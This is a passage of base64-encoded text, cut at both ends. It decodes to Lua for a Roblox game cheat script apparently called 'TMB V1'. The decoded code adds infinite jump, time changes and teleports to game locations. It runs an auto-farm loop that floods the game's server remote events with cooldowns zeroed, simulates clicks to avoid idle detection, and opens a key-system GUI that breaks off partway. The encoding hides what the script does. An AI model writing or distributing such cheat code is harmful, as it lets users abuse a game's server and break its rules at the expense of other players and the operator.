ikKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgSW5maW5pdGVKdW1wQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIkhpZ2ggbmEgSGlnaCIsCiAgICAgICAgICAgIFRleHQgPSAiU3VtYWtzZXMga2EgZWgiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDAKICAgICAgICB9KQogICAgZW5kCmVuZCkKCmxvY2FsIHRpbWVEcm9wZG93biA9IG1pc2MzRm9sZGVyOkFkZERyb3Bkb3duKCJDaGFuZ2UgVGltZSIsIGZ1bmN0aW9uKHNlbGVjdGlvbikKICAgIGxvY2FsIGxpZ2h0aW5nID0gZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpCiAgICAKICAgIGlmIHNlbGVjdGlvbiA9PSAiTmlnaHQiIHRoZW4KICAgICAgICBsaWdodGluZy5DbG9ja1RpbWUgPSAwCiAgICBlbHNlaWYgc2VsZWN0aW9uID09ICJEYXkiIHRoZW4KICAgICAgICBsaWdodGluZy5DbG9ja1RpbWUgPSAxMgogICAgZWxzZWlmIHNlbGVjdGlvbiA9PSAiTWlkbmlnaHQiIHRoZW4KICAgICAgICBsaWdodGluZy5DbG9ja1RpbWUgPSA2CiAgICBlbmQKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJIb3JhIENhbWJpYWRhIiwKICAgICAgICBUZXh0ID0gIkxhIGhvcmEgZGVsIGTDrWEgaGEgc2lkbyBjYW1iaWFkYSBhOiAiIC4uIHNlbGVjdGlvbiwKICAgICAgICBEdXJhdGlvbiA9IDAKICAgIH0pCmVuZCkKCi0tIEFkZCB0aW1lIG9wdGlvbnMKdGltZURyb3Bkb3duOkFkZCgiTmlnaHQiKQp0aW1lRHJvcGRvd246QWRkKCJEYXkiKQp0aW1lRHJvcGRvd246QWRkKCJNaWRuaWdodCIpCgptaXNjVGFiOkFkZExhYmVsKCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikuVGV4dFNpemUgPSAxNQoKbWlzY1RhYjpBZGRMYWJlbCgiICIpLlRleHRTaXplID0gMTUKbWlzY1RhYjpBZGRMYWJlbCgiVGVsZXBvcnQiKS5UZXh0U2l6ZSA9IDIwCm1pc2NUYWI6QWRkTGFiZWwoIiAiKS5UZXh0U2l6ZSA9IDE1CgptaXNjVGFiOkFkZEJ1dHRvbigiVGlueSBJc2xhbmQiLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMzEuODYyNjE5NCwgNi4wNTg4MDI2LCAyMDg3Ljg4NjcyKQplbmQpCgptaXNjVGFiOkFkZEJ1dHRvbigiU3RhcnRlciBJc2xhbmQiLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygyMjYuMjUyNDcyLCA4LjE1MjY5NDcsIDIxOS4zNjY1MTYpCmVuZCkKCm1pc2NUYWI6QWRkQnV0dG9uKCJMZWdlbmQgQmVhY2giLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMzY1Ljc5ODMwOSwgNDQuNTA4MjkzMiwgLTUwMS42MTg1OTEpCmVuZCkKCm1pc2NUYWI6QWRkQnV0dG9uKCJGcm9zdCBHeW0iLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMjkzMy40Nzk5OCwgMjkuNjM5OTYxMiwgLTU3OS45NDYwNDUpCmVuZCkKCm1pc2NUYWI6QWRkQnV0dG9uKCJNeXRoaWNhbCBHeW0iLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygyNjU5LjUwNjM1LCAyMS42MDk1MjM4LCA5MzQuNjkwNjEzKQplbmQpCgptaXNjVGFiOkFkZEJ1dHRvbigiRXRlcm5hbCBHeW0iLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtNzE3Ni4xOTE0MSwgNDUuMzk0MTA0LCAtMTEwNi4zMTQyMSkKZW5kKQoKbWlzY1RhYjpBZGRCdXR0b24oIkxlZ2VuZCBHeW0iLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg0NDQ2LjkxNjk5LCAxMDA0LjQ2Njk4LCAtMzk4My43NjA3NCkKZW5kKQoKbWlzY1RhYjpBZGRCdXR0b24oIkp1bmdsZSBHeW0iLCBmdW5jdGlvbigpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtODEzNywgMjgsIDI4MjApCmVuZCkKCm1pc2NUYWI6QWRkTGFiZWwoIlRvb2xzOiIpLlRleHRTaXplID0gMjIKCmxvY2FsIFNlbGVjdGVkTW9kZSA9IG5pbApsb2NhbCBBdXRvRmFybSA9IGZhbHNlCgpsb2NhbCBtb2RlRHJvcGRvd24gPSBtaXNjVGFiOkFkZERyb3Bkb3duKCJTZWxlY3QgVG9vbCIsIGZ1bmN0aW9uKHNlbGVjdGlvbikKICAgIFNlbGVjdGVkTW9kZSA9IHNlbGVjdGlvbgplbmQpCgptb2RlRHJvcGRvd246QWRkKCJXZWlnaHQiKQptb2RlRHJvcGRvd246QWRkKCJQdXNodXBzIikKbW9kZURyb3Bkb3duOkFkZCgiU2l0dXBzIikKbW9kZURyb3Bkb3duOkFkZCgiSGFuZHN0YW5kcyIpCm1vZGVEcm9wZG93bjpBZGQoIkZhc3QgUHVuY2giKQptb2RlRHJvcGRvd246QWRkKCJTdG9tcCIpCm1vZGVEcm9wZG93bjpBZGQoIkdyb3VuZCBTbGFtIikKCm1vZGVEcm9wZG93bjpBZGQoIldlaWdodCArIFB1bmNoIikKbW9kZURyb3Bkb3duOkFkZCgiUHVzaHVwcyArIFB1bmNoIikKbW9kZURyb3Bkb3duOkFkZCgiU2l0dXBzICsgUHVuY2giKQoKbG9jYWwgZnVuY3Rpb24gZXF1aXBUb29sRmFzdChwbGF5ZXIsIHRvb2xOYW1lLCByZXBOYW1lLCByZXBWYWx1ZSkKICAgIGxvY2FsIHRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbE5hbWUpIG9yIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbE5hbWUpCiAgICBpZiB0b29sIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiByZXBOYW1lIGFuZCB0b29sOkZpbmRGaXJzdENoaWxkKHJlcE5hbWUpIHRoZW4KICAgICAgICAgICAgdG9vbFtyZXBOYW1lXS5WYWx1ZSA9IHJlcFZhbHVlCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBmYXN0UHVuY2gocGxheWVyKQogICAgbG9jYWwgcHVuY2ggPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgaWYgcHVuY2ggdGhlbgogICAgICAgIHB1bmNoLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4gcHVuY2guYXR0YWNrVGltZS5WYWx1ZSA9IDAgZW5kCiAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCiAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgaWYgcHVuY2hUb29sIHRoZW4gcHVuY2hUb29sOkFjdGl2YXRlKCkgZW5kCiAgICBlbmQKZW5kCgptaXNjVGFiOkFkZFN3aXRjaCgiU3RhcnQiLCBmdW5jdGlvbihlbmFibGVkKQogICAgQXV0b0Zhcm0gPSBlbmFibGVkCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgoKICAgIGxvY2FsIGZ1bmN0aW9uIHVuZXF1aXBBbGwoKQogICAgICAgIGxvY2FsIHRvb2xzVG9VbmVxdWlwID0ge30KICAgICAgICBpZiBzdHJpbmcuZmluZChTZWxlY3RlZE1vZGUsICJXZWlnaHQiKSBvciBzdHJpbmcuZmluZChTZWxlY3RlZE1vZGUsICJQdXNodXBzIikgb3Igc3RyaW5nLmZpbmQoU2VsZWN0ZWRNb2RlLCAiU2l0dXBzIikgb3Igc3RyaW5nLmZpbmQoU2VsZWN0ZWRNb2RlLCAiSGFuZHN0YW5kcyIpIHRoZW4KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHRvb2xzVG9VbmVxdWlwLCBTZWxlY3RlZE1vZGUpCiAgICAgICAgZW5kCiAgICAgICAgaWYgU2VsZWN0ZWRNb2RlID09ICJGYXN0IFB1bmNoIiBvciBTZWxlY3RlZE1vZGUgPT0gIlN0b21wIiBvciBTZWxlY3RlZE1vZGUgPT0gIkdyb3VuZCBTbGFtIiB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydCh0b29sc1RvVW5lcXVpcCwgU2VsZWN0ZWRNb2RlID09ICJGYXN0IFB1bmNoIiBhbmQgIlB1bmNoIiBvciBTZWxlY3RlZE1vZGUpCiAgICAgICAgZW5kCiAgICAgICAgaWYgc3RyaW5nLmZpbmQoU2VsZWN0ZWRNb2RlLCAiQ29tYm86IikgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQodG9vbHNUb1VuZXF1aXAsICJQdW5jaCIpCiAgICAgICAgICAgIGlmIHN0cmluZy5maW5kKFNlbGVjdGVkTW9kZSwgIldlaWdodCIpIHRoZW4gdGFibGUuaW5zZXJ0KHRvb2xzVG9VbmVxdWlwLCAiV2VpZ2h0IikgZW5kCiAgICAgICAgICAgIGlmIHN0cmluZy5maW5kKFNlbGVjdGVkTW9kZSwgIlB1c2h1cHMiKSB0aGVuIHRhYmxlLmluc2VydCh0b29sc1RvVW5lcXVpcCwgIlB1c2h1cHMiKSBlbmQKICAgICAgICAgICAgaWYgc3RyaW5nLmZpbmQoU2VsZWN0ZWRNb2RlLCAiU2l0dXBzIikgdGhlbiB0YWJsZS5pbnNlcnQodG9vbHNUb1VuZXF1aXAsICJTaXR1cHMiKSBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBjaGFyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGZvciBfLCB0b29sTmFtZSBpbiBpcGFpcnModG9vbHNUb1VuZXF1aXApIGRvCiAgICAgICAgICAgIGxvY2FsIGVxID0gY2hhcjpGaW5kRmlyc3RDaGlsZCh0b29sTmFtZSkKICAgICAgICAgICAgaWYgZXEgdGhlbiBlcS5QYXJlbnQgPSBwbGF5ZXIuQmFja3BhY2sgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBpZiBlbmFibGVkIHRoZW4KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgQXV0b0Zhcm0gZG8KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgU2VsZWN0ZWRNb2RlID09ICJXZWlnaHQiIG9yIFNlbGVjdGVkTW9kZSA9PSAiUHVzaHVwcyIgb3IgU2VsZWN0ZWRNb2RlID09ICJTaXR1cHMiIG9yIFNlbGVjdGVkTW9kZSA9PSAiSGFuZHN0YW5kcyIgdGhlbgogICAgICAgICAgICAgICAgICAgIGVxdWlwVG9vbEZhc3QocGxheWVyLCBTZWxlY3RlZE1vZGUsICJyZXBUaW1lIiwgMCkKICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKCiAgICAgICAgICAgICAgICBlbHNlaWYgU2VsZWN0ZWRNb2RlID09ICJGYXN0IFB1bmNoIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZmFzdFB1bmNoKHBsYXllcikKCiAgICAgICAgICAgICAgICBlbHNlaWYgU2VsZWN0ZWRNb2RlID09ICJTdG9tcCIgdGhlbgogICAgICAgICAgICAgICAgICAgIGVxdWlwVG9vbEZhc3QocGxheWVyLCAiU3RvbXAiLCAiYXR0YWNrVGltZSIsIDApCiAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInN0b21wIikKICAgICAgICAgICAgICAgICAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJTdG9tcCIpIHRoZW4gcGxheWVyLkNoYXJhY3Rlci5TdG9tcDpBY3RpdmF0ZSgpIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIHRpY2soKSAlIDYgPCAwLjEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2aXJ0dWFsVXNlciA9IGdhbWU6R2V0U2VydmljZSgiVmlydHVhbFVzZXIiKQogICAgICAgICAgICAgICAgICAgICAgICB2aXJ0dWFsVXNlcjpDYXB0dXJlQ29udHJvbGxlcigpCiAgICAgICAgICAgICAgICAgICAgICAgIHZpcnR1YWxVc2VyOkNsaWNrQnV0dG9uMShWZWN0b3IyLm5ldyg1MDAsIDUwMCkpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgZWxzZWlmIFNlbGVjdGVkTW9kZSA9PSAiR3JvdW5kIFNsYW0iIHRoZW4KICAgICAgICAgICAgICAgICAgICBlcXVpcFRvb2xGYXN0KHBsYXllciwgIkdyb3VuZCBTbGFtIiwgImF0dGFja1RpbWUiLCAwKQogICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJzbGFtIikKICAgICAgICAgICAgICAgICAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJHcm91bmQgU2xhbSIpIHRoZW4gcGxheWVyLkNoYXJhY3RlclsiR3JvdW5kIFNsYW0iXTpBY3RpdmF0ZSgpIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIHRpY2soKSAlIDYgPCAwLjEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2aXJ0dWFsVXNlciA9IGdhbWU6R2V0U2VydmljZSgiVmlydHVhbFVzZXIiKQogICAgICAgICAgICAgICAgICAgICAgICB2aXJ0dWFsVXNlcjpDYXB0dXJlQ29udHJvbGxlcigpCiAgICAgICAgICAgICAgICAgICAgICAgIHZpcnR1YWxVc2VyOkNsaWNrQnV0dG9uMShWZWN0b3IyLm5ldyg1MDAsIDUwMCkpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGVsc2VpZiBTZWxlY3RlZE1vZGUgPT0gIldlaWdodCArIFB1bmNoIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZXF1aXBUb29sRmFzdChwbGF5ZXIsICJXZWlnaHQiLCAicmVwVGltZSIsIDApCiAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICAgICAgZmFzdFB1bmNoKHBsYXllcikKCiAgICAgICAgICAgICAgICBlbHNlaWYgU2VsZWN0ZWRNb2RlID09ICJQdXNodXBzICsgUHVuY2giIHRoZW4KICAgICAgICAgICAgICAgICAgICBlcXVpcFRvb2xGYXN0KHBsYXllciwgIlB1c2h1cHMiLCAicmVwVGltZSIsIDApCiAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICAgICAgZmFzdFB1bmNoKHBsYXllcikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGVsc2VpZiBTZWxlY3RlZE1vZGUgPT0gIlNpdHVwcyArIFB1bmNoIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZXF1aXBUb29sRmFzdChwbGF5ZXIsICJTaXR1cHMiLCAicmVwVGltZSIsIDApCiAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICAgICAgZmFzdFB1bmNoKHBsYXllcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgdW5lcXVpcEFsbCgpCiAgICBlbmQKZW5kKQoKbG9jYWwgaW5mb1RhYiA9IHdpbmRvdzpBZGRUYWIoIkNyZWRpdHMiKQppbmZvVGFiOlNob3coKQppbmZvVGFiOkFkZExhYmVsKCJNYWRlIGJ5IFNlbvCfkpkiKS5UZXh0U2l6ZSA9IDIwCgppbmZvVGFiOkFkZExhYmVsKCIiKQpsb2NhbCB3TGFiZWwgPSBpbmZvVGFiOkFkZExhYmVsKCJWRVJTSU9OLy8xLjAuMCIpCndMYWJlbC5UZXh0U2l6ZSA9IDQwCndMYWJlbC5Gb250ID0gRW51bS5Gb250LkFyY2FkZQoKbG9jYWwgd0xhYmVsID0gaW5mb1RhYjpBZGRMYWJlbCgiVE1CIFYxIikKd0xhYmVsLlRleHRTaXplID0gNDAKd0xhYmVsLkZvbnQgPSBFbnVtLkZvbnQuQXJjYWRlCgogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZUdVSSgpCiAgICBpZiBwbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJMdWFMYWJTdHVkaW9zIikgdGhlbgogICAgICAgIHBsYXllci5QbGF5ZXJHdWkuTHVhTGFiU3R1ZGlvczpEZXN0cm95KCkKICAgIGVuZAogICAgCiAgICBsb2NhbCBzY3JlZW5HdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICBzY3JlZW5HdWkuTmFtZSA9ICJMdWFMYWJTdHVkaW9zIgogICAgc2NyZWVuR3VpLlBhcmVudCA9IHBsYXllci5QbGF5ZXJHdWkKICAgIHNjcmVlbkd1aS5SZXNldE9uU3Bhd24gPSBmYWxzZQogICAgCiAgICBsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgZnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLCAzODAsIDAsIDIyMCkKICAgIGZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE5MCwgMC41LCAtMTEwKQogICAgZnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMzUpCiAgICBmcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBmcmFtZS5BY3RpdmUgPSB0cnVlCiAgICBmcmFtZS5EcmFnZ2FibGUgPSB0cnVlCiAgICBmcmFtZS5QYXJlbnQgPSBzY3JlZW5HdWkKICAgIAogICAgbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTIpCiAgICBjb3JuZXIuUGFyZW50ID0gZnJhbWUKICAgIAogICAgbG9jYWwgc3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCiAgICBzdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig4MCwgODAsIDEwMCkKICAgIHN0cm9rZS5UaGlja25lc3MgPSAyCiAgICBzdHJva2UuUGFyZW50ID0gZnJhbWUKICAgIAogICAgbG9jYWwgdGl0bGUgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICB0aXRsZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDUwKQogICAgdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKICAgIHRpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0aXRsZS5UZXh0ID0gIlRNQiBLZXkgU3lzdGVtIgogICAgdGl0bGUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICB0aXRsZS5UZXh0U2l6ZSA9IDIyCiAgICB0aXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIHRpdGxlLlBhcmVudCA9IGZyYW1lCiAgICAKICAgIGxvY2FsIGtleUlucHV0ID0gSW5zdGFuY2UubmV3KCJUZXh0Qm94IikKICAgIGtleUlucHV0LlNpemUgPSBVRGltMi5uZXcoMC44NSwgMCwgMCwgMzUpCiAgICBrZXlJbnB1dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA3NSwgMCwgMCwgODApCiAgICBrZXlJbnB1dC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1NSkKICAgIGtleUlucHV0LkJvcmRlclNpemVQaXhlbCA9IDAKICAgIGtleUlucHV0LlBsYWNlaG9sZGVyVGV4dCA9ICJFbnRlciB5b3VyIGtleS4uLiIKICAgIGtleUlucHV0LlBsYWNlaG9sZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTIwLCAxMjAsIDEyMCkKICAgIGtleUlucHV0LlRleHQgPSAiIgogICAga2V5SW5wdXQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBrZXlJbnB1dC5UZXh0U2l6ZSA9IDE2CiAgICBrZXlJbnB1dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAga2V5SW5wdXQuUGFyZW50ID0gZnJhbWUKICAgIAogICAgbG9jYWwga2V5Q29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBrZXlDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKICAgIGtleUNvcm5lci5QYXJlbnQgPSBrZXlJbnB1dAogICAgCiAgICBsb2NhbCBleGVjdXRlQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIGV4ZWN1dGVCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjQsIDAsIDAsIDM1KQogICAgZXhlY3V0ZUJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA3NSwgMCwgMCwgMTMwKQogICAgZXhlY3V0ZUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTYwLCA2MCkKICAgIGV4ZWN1dGVCdG4uQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgZXhlY3V0ZUJ0bi5UZXh0ID0gIkV4ZWN1dGUiCiAgICBleGVjdXRlQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgZXhlY3V0ZUJ0bi5UZXh0U2l6ZSA9IDE2CiAgICBleGVjdXRlQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgZXhlY3V0ZUJ0bi5QYXJlbnQgPSBmcmFtZQogICAgCiAgICBsb2NhbCBleGVjQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBleGVjQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDgpCiAgICBleGVjQ29ybmVyLlBhcmVudCA9IGV4ZWN1dGVCdG4KICAgIAogICAgbG9jYWwgZ2V0S2V5QnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIGdldEtleUJ0bi5TaXplID0gVURpbTIubmV3KDAuNCwgMCwgMCwgMzUpCiAgICBnZXRLZXlCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC41MjUsIDAsIDAsIDEzMCkKICAgIGdldEtleUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTIwLCA2MCwgMjIwKQogICAgZ2V0S2V5QnRuLkJvcmRlclNpemVQaXhlbCA9IDAKICAgIGdldEtleUJ0bi5UZXh0ID0gIkdldCBLZXkiCiAgICBnZXRLZXlCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBnZXRLZXlCdG4uVGV4dFNpemUgPSAxNgogICAgZ2V0S2V5QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgZ2V0S2V5QnRuLlBhcmVudCA9IGZyYW1lCiAgICAKICAgIGxvY2FsIGdldEtleUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgZ2V0S2V5Q29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDgpCiAgICBnZXRLZXlDb3JuZXIuUGFyZW50ID0gZ2V0S2V5QnRuCiAgICAKICAgIGxvY2FsIHN0YXR1cyA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIHN0YXR1cy5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgc3RhdHVzLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDE3NSkKICAgIHN0YXR1cy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgc3RhdHVzLlRleHQgPSAiUmVhZHkgdG8gdmFsaWRhdGUga2V5IgogICAgc3RhdHVzLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDIwMCwgMTAwKQogICAgc3RhdHVzLlRleHRTaXplID0gMTQKICAgIHN0YXR1cy5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgc3RhdHVzLlBhcmVudCA9IGZyYW1lCiAgICAKICAgIGxvY2FsIGNsb3NlQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIGNsb3NlQnRuLlNpemUgPSBVRGltMi5uZXcoMCwgMzAsIDAsIDMwKQogICAgY2xvc2VCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTM1LCAwLCA1KQogICAgY2xvc2VCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIyMCwgNjAsIDYwKQogICAgY2xvc2VCdG4uQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgY2xvc2VCdG4uVGV4dCA9ICJYIgogICAgY2xvc2VCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBjbG9zZUJ0bi5UZXh0U2l6ZSA9IDE2CiAgICBjbG9zZUJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIGNsb3NlQnRuLlBhcmVudCA9IGZyYW1lCiAgICAKICAgIGxvY2FsIGNsb3NlQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBjbG9zZUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxNSkKICAgIGNsb3NlQ29ybmVyLlBhcmVudCA9IGNsb3NlQnRuCiAgICAKICAgIGV4ZWN1dGVCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgbG9jY